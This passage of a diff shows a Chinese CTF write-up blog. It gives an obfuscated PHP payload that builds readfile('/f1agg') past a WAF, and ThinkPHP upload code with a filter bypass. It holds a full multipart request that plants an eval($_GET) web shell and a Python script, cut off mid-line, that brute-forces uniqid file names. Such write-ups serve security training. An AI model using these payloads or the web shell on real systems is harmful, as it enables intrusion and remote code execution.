class="number">26</span>(~((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))))</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs php">readfile(<span class="hljs-string">'/f1agg'</span>)，payload：
+
+?num=(((((<span class="hljs-number">1</span>).(<span class="hljs-number">2</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">100000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)%<span class="hljs-number">26</span>(~((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)))).(((((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">4</span>&#125;))%<span class="hljs-number">26</span>(((<span class="hljs-number">1</span>).(<span class="hljs-number">5</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">100000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)%<span class="hljs-number">26</span>(~((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)))).((((<span class="hljs-number">1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">26</span>(((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">4</span>&#125;)|(((<span class="hljs-number">100000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)%<span class="hljs-number">26</span>(~((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)))).((((<span class="hljs-number">1</span>).(<span class="hljs-number">4</span>))&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">26</span>(((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">100000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)%<span class="hljs-number">26</span>(~((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)))).((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">26</span>(((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">100000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)%<span class="hljs-number">26</span>(~((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)))).((((<span class="hljs-number">1</span>).(<span class="hljs-number">9</span>))&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">26</span>(((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">4</span>&#125;)|(((<span class="hljs-number">100000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)%<span class="hljs-number">26</span>(~((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)))).(((((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">4</span>&#125;)|(((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>).(<span class="hljs-number">4</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">8</span>))&#123;<span class="hljs-number">1</span>&#125;))|(((<span class="hljs-number">100000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)%<span class="hljs-number">26</span>(~((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)))).(((((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">4</span>&#125;))%<span class="hljs-number">26</span>(((<span class="hljs-number">1</span>).(<span class="hljs-number">5</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">100000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)%<span class="hljs-number">26</span>(~((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)))))(((((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">4</span>&#125;)).((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">26</span>(((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">100000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)%<span class="hljs-number">26</span>(~((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)))).((((<span class="hljs-number">1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)).((((<span class="hljs-number">1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">26</span>(((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">4</span>&#125;)|(((<span class="hljs-number">100000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)%<span class="hljs-number">26</span>(~((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)))).(((((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">4</span>&#125;))%<span class="hljs-number">26</span>(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">100000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)%<span class="hljs-number">26</span>(~((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)))).(((((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">4</span>&#125;))%<span class="hljs-number">26</span>(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">100000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)%<span class="hljs-number">26</span>(~((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)))))</code></pre>
 
 
 
@@ -229,7 +388,9 @@
 
 
 <h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><p>parse_str过waf或者http请求走私</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dechex() 十进制转换为十六进制</span><br><span class="line">hex2bin() 十六进制转换为ASCII字符</span><br><span class="line">base_convert(num,frombase,tobase) 将num为frombase转换为指定进制tobase</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">dechex</span><span class="hljs-params">()</span></span> 十进制转换为十六进制
+<span class="hljs-function"><span class="hljs-title">hex2bin</span><span class="hljs-params">()</span></span> 十六进制转换为ASCII字符
+<span class="hljs-function"><span class="hljs-title">base_convert</span><span class="hljs-params">(num,frombase,tobase)</span></span> 将num为frombase转换为指定进制tobase</code></pre>
 
 
 
@@ -237,42 +398,148 @@
 <p>var_dump(base_convert(61693386291,10,36)(hex2bin(dechex(47))))</p>
 <p>var_dump(scandir(‘/‘))</p>
 </blockquote>
-<p><img src="./1571201776415.png" alt="1571201776415"></p>
+<p><img src="./1571201776415.png" srcset="/img/loading.gif" alt="1571201776415"></p>
 <blockquote>
 <p>readfile(/f1agg)</p>
 <p>base_convert(2146934604002,10,36)(hex2bin(dechex(47)).(f1agg))</p>
 </blockquote>
-<p><img src="./1571201900561.png" alt="1571201900561"></p>
-<p><img src="./1571201983786.png" alt="1571201983786"></p>
+<p><img src="./1571201900561.png" srcset="/img/loading.gif" alt="1571201900561"></p>
+<p><img src="./1571201983786.png" srcset="/img/loading.gif" alt="1571201983786"></p>
 <h1 id="simple-Upload"><a href="#simple-Upload" class="headerlink" title="simple-Upload"></a>simple-Upload</h1><p>题目</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $uploadFile = $_FILES[<span class="string">'file'</span>] ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (strstr(strtolower($uploadFile[<span class="string">'name'</span>]), <span class="string">".php"</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $upload = <span class="keyword">new</span> \Think\Upload();<span class="comment">// 实例化上传类</span></span><br><span class="line">        $upload-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// 设置附件上传大小</span></span><br><span class="line">        $upload-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">'jpg'</span>, <span class="string">'gif'</span>, <span class="string">'png'</span>, <span class="string">'jpeg'</span>);<span class="comment">// 设置附件上传类型</span></span><br><span class="line">        $upload-&gt;rootPath = <span class="string">'./Public/Uploads/'</span>;<span class="comment">// 设置附件上传目录</span></span><br><span class="line">        $upload-&gt;savePath = <span class="string">''</span>;<span class="comment">// 设置附件上传子目录</span></span><br><span class="line">        $info = $upload-&gt;upload() ;</span><br><span class="line">        <span class="keyword">if</span>(!$info) &#123;<span class="comment">// 上传错误提示错误信息</span></span><br><span class="line">          <span class="keyword">$this</span>-&gt;error($upload-&gt;getError());</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// 上传成功 获取上传文件信息</span></span><br><span class="line">          $url = __ROOT__.substr($upload-&gt;rootPath,<span class="number">1</span>).$info[<span class="string">'file'</span>][<span class="string">'savepath'</span>].$info[<span class="string">'file'</span>][<span class="string">'savename'</span>] ;</span><br><span class="line">          <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">"url"</span>=&gt;$url,<span class="string">"success"</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">Home</span>\<span class="hljs-title">Controller</span>;
+
+<span class="hljs-keyword">use</span> <span class="hljs-title">Think</span>\<span class="hljs-title">Controller</span>;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span>
+<span class="hljs-class"></span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span><span class="hljs-params">()</span></span>
+<span class="hljs-function">    </span>&#123;
+        show_source(<span class="hljs-keyword">__FILE__</span>);
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span><span class="hljs-params">()</span></span>
+<span class="hljs-function">    </span>&#123;
+        $uploadFile = $_FILES[<span class="hljs-string">'file'</span>] ;
+        
+        <span class="hljs-keyword">if</span> (strstr(strtolower($uploadFile[<span class="hljs-string">'name'</span>]), <span class="hljs-string">".php"</span>) ) &#123;
+            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
+        &#125;
+        
+        $upload = <span class="hljs-keyword">new</span> \Think\Upload();<span class="hljs-comment">// 实例化上传类</span>
+        $upload-&gt;maxSize  = <span class="hljs-number">4096</span> ;<span class="hljs-comment">// 设置附件上传大小</span>
+        $upload-&gt;allowExts  = <span class="hljs-keyword">array</span>(<span class="hljs-string">'jpg'</span>, <span class="hljs-string">'gif'</span>, <span class="hljs-string">'png'</span>, <span class="hljs-string">'jpeg'</span>);<span class="hljs-comment">// 设置附件上传类型</span>
+        $upload-&gt;rootPath = <span class="hljs-string">'./Public/Uploads/'</span>;<span class="hljs-comment">// 设置附件上传目录</span>
+        $upload-&gt;savePath = <span class="hljs-string">''</span>;<span class="hljs-comment">// 设置附件上传子目录</span>
+        $info = $upload-&gt;upload() ;
+        <span class="hljs-keyword">if</span>(!$info) &#123;<span class="hljs-comment">// 上传错误提示错误信息</span>
+          <span class="hljs-keyword">$this</span>-&gt;error($upload-&gt;getError());
+          <span class="hljs-keyword">return</span>;
+        &#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-comment">// 上传成功 获取上传文件信息</span>
+          $url = __ROOT__.substr($upload-&gt;rootPath,<span class="hljs-number">1</span>).$info[<span class="hljs-string">'file'</span>][<span class="hljs-string">'savepath'</span>].$info[<span class="hljs-string">'file'</span>][<span class="hljs-string">'savename'</span>] ;
+          <span class="hljs-keyword">echo</span> json_encode(<span class="hljs-keyword">array</span>(<span class="hljs-string">"url"</span>=&gt;$url,<span class="hljs-string">"success"</span>=&gt;<span class="hljs-number">1</span>));
+        &#125;
+    &#125;
+&#125;</code></pre>
 
 
 <p>上传三个文件缩小时间爆破范围</p>
 <p><code>strstr</code>传入数组<code>warning</code>报错，回显<code>false</code></p>
-<p><img src="./1571108312495.png" alt="1571108312495"></p>
+<p><img src="./1571108312495.png" srcset="/img/loading.gif" alt="1571108312495"></p>
 <p><code>$files</code>为空直接赋值$_FILES变量,<strong>关键处</strong></p>
-<p><img src="./1571109934502.png" alt="1571109934502"></p>
+<p><img src="./1571109934502.png" srcset="/img/loading.gif" alt="1571109934502"></p>
 <p>再处理$files数组，遍历键值对，解放<code>$files</code>二维数组为一维数组</p>
-<p><img src="./1571111012921.png" alt="1571111012921"></p>
+<p><img src="./1571111012921.png" srcset="/img/loading.gif" alt="1571111012921"></p>
 <p>调用配置文件中保存文件处理函数,<strong>uniqid函数</strong></p>
-<p><img src="./1571110449119.png" alt="1571110449119"></p>
+<p><img src="./1571110449119.png" srcset="/img/loading.gif" alt="1571110449119"></p>
 <p><code>call_user_func_arrary</code> 调用<code>uniqid()</code>,生成文件名。</p>
-<p><img src="./1571110604190.png" alt="1571110604190"></p>
+<p><img src="./1571110604190.png" srcset="/img/loading.gif" alt="1571110604190"></p>
 <p>保存文件</p>
-<p><img src="./1571111166570.png" alt="1571111166570"></p>
-<h2 id="uniqid函数"><a href="#uniqid函数" class="headerlink" title="uniqid函数"></a>uniqid函数</h2><p><img src="./1571202207913.png" alt="1571202207913"></p>
+<p><img src="./1571111166570.png" srcset="/img/loading.gif" alt="1571111166570"></p>
+<h2 id="uniqid函数"><a href="#uniqid函数" class="headerlink" title="uniqid函数"></a>uniqid函数</h2><p><img src="./1571202207913.png" srcset="/img/loading.gif" alt="1571202207913"></p>
 <h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>同时上传两个个文件，缩小爆破范围，远程可以上传三个文件更进一步缩小范围</p>
 <p>本地显示爆破后３位就可以，远程需要后5位</p>
-<p><img src="./1571109567467.png" alt="1571109567467"></p>
-<h2 id="文件上传exp"><a href="#文件上传exp" class="headerlink" title="文件上传exp"></a>文件上传exp</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?m=home&amp;c=index&amp;a=upload</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: umgmalytroarctf.4hou.com.cn:32901</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------9130902641497288610839855586</span><br><span class="line"><span class="attribute">Content-Length</span>: 387</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">-----------------------------9130902641497288610839855586</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename="as.txt"</span><br><span class="line"><span class="attribute">Content-Type</span>: text/plain</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo(); eval($_GET[_]); ?&gt;</span><br><span class="line">-----------------------------9130902641497288610839855586</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name[1]="file"; filename="as.php"</span><br><span class="line"><span class="attribute">Content-Type</span>: text/plain</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo(); eval($_GET[_]); ?&gt;</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename="as.txt"</span><br><span class="line"><span class="attribute">Content-Type</span>: text/plain</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo(); eval($_GET[_]); ?&gt;</span><br><span class="line">-----------------------------9130902641497288610839855586</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="submit"</span><br><span class="line"></span><br><span class="line"><span class="attribute">upload</span></span><br><span class="line"><span class="attribute">-----------------------------9130902641497288610839855586--</span></span><br></pre></td></tr></table></figure>
+<p><img src="./1571109567467.png" srcset="/img/loading.gif" alt="1571109567467"></p>
+<h2 id="文件上传exp"><a href="#文件上传exp" class="headerlink" title="文件上传exp"></a>文件上传exp</h2><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php?m=home&amp;c=index&amp;a=upload</span> HTTP/1.1
+<span class="hljs-attribute">Host</span>: umgmalytroarctf.4hou.com.cn:32901
+<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
+<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+<span class="hljs-attribute">Accept-Language</span>: en-US,en;q=0.5
+<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate
+<span class="hljs-attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------9130902641497288610839855586
+<span class="hljs-attribute">Content-Length</span>: 387
+<span class="hljs-attribute">DNT</span>: 1
+<span class="hljs-attribute">Connection</span>: close
+<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1
+
+-----------------------------9130902641497288610839855586
+<span class="hljs-attribute">Content-Disposition</span>: form-data; name="file"; filename="as.txt"
+<span class="hljs-attribute">Content-Type</span>: text/plain
+
+&lt;?php phpinfo(); eval($_GET[_]); ?&gt;
+-----------------------------9130902641497288610839855586
+<span class="hljs-attribute">Content-Disposition</span>: form-data; name[1]="file"; filename="as.php"
+<span class="hljs-attribute">Content-Type</span>: text/plain
+
+&lt;?php phpinfo(); eval($_GET[_]); ?&gt;
+<span class="hljs-attribute">Content-Disposition</span>: form-data; name="file"; filename="as.txt"
+<span class="hljs-attribute">Content-Type</span>: text/plain
+
+&lt;?php phpinfo(); eval($_GET[_]); ?&gt;
+-----------------------------9130902641497288610839855586
+<span class="hljs-attribute">Content-Disposition</span>: form-data; name="submit"
+
+<span class="hljs-attribute">upload</span>
+<span class="hljs-attribute">-----------------------------9130902641497288610839855586--</span></code></pre>
 
 
 
 
 
 <h2 id="后缀爆破"><a href="#后缀爆破" class="headerlink" title="后缀爆破"></a>后缀爆破</h2><p>实在是太慢了，buuoj对多线程限制，就不爆了。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">a&#x3D;&#39;&#39;</span><br><span class="line"># for i in range(0x100,0xfff):</span><br><span class="line">#     url &#x3D; &quot;http:&#x2F;&#x2F;51da9aa4-dbbf-495c-9eb4-00ffb16bde78.node2.buuoj.cn.wetolink.com:82&#x2F;Public&#x2F;Uploads&#x2F;2019-10-15&#x2F;5da5495e5d&quot;+hex(i)[2:]+&#39;.php&#39;</span><br><span class="line">#     rep &#x3D; requests.get(url)</span><br><span class="line">#     print(hex(i)[2:])</span><br><span class="line">#     if &#39;Version&#39; in rep.text:</span><br><span class="line">#         print(url)</span><br><span class="line">#         a+&#x3D;url</span><br><span class="line">#         sys.exit()</span><br><span class="line">#         break</span><br><span class="line">        </span><br><span class="line"># for i in range(0x1000,0xffff):</span><br><span class="line">#     url &#x3D; &quot;http:&#x2F;&#x2F;51da9aa4-dbbf-495c-9eb4-00ffb16bde78.node2.buuoj.cn.wetolink.com:82&#x2F;Public&#x2F;Uploads&#x2F;2019-10-15&#x2F;5da5495e5&quot;+hex(i)[2:]+&#39;.php&#39;</span><br><span class="line">#     rep &#x3D; requests.get(url)</span><br><span class="line">#     print(hex(i)[2:])</span><br><span class="line">#     if &#39;Version&#39; in rep.text:</span><br><span class="line">#         print(url)</span><br><span class="line">#         a+&#x3D;url</span><br><span class="line">#         sys.exit()</span><br><span class="line">#         break</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">for i in range(0x6cd19,0xfffff):</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;51da9aa4-dbbf-495c-9eb4-00ffb16bde78.node2.buuoj.cn.wetolink.com:82&#x2F;Public&#x2F;Uploads&#x2F;2019-10-15&#x2F;5da5583e&quot;+hex(i)[2:]+&#39;.php&#39;</span><br><span class="line">    rep &#x3D; requests.get(url)</span><br><span class="line">    print(hex(i)[2:])</span><br><span class="line">    if &#39;Version&#39; in rep.text:</span><br><span class="line">        print(url)</span><br><span class="line">        a+&#x3D;url</span><br><span class="line">        sys.exit()</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">for i in range(0xe6cd19,0xffffff):</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;51da9aa4-dbbf-495c-9eb4-00ffb16bde78.node2.buuoj.cn.wetolink.com:82&#x2F;Public&#x2F;Uploads&#x2F;2019-10-15&#x2F;5da5583&quot;+hex(i)[2:]+&#39;.php&#39;</span><br><span class="line">    rep &#x3D; requests.get(url)</span><br><span class="line">    print(hex(i)[2:])</span><br><span class="line">    if &#39;Version&#39; 